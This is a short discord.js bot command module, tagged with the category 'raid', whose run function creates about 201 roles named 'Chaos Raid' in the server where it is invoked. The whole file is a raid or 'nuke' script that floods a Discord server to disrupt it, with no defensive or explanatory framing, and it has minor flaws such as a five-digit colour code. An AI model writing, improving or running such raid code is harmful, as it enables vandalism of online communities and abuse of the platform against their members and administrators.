const { MessageEmbed } = require('discord.js')
module.exports = {
    name : 'createroles',
    category : 'raid',
    description : 'Crea hasta 200 roles',

    run : async(client, message, args) => {
        for (let i = 0; i <= 200; i++) {
            message.guild.roles.create({data: {name: `Chaos Raid`,color: '#FFFFF',},reason: 'razon',})
         };
    }
}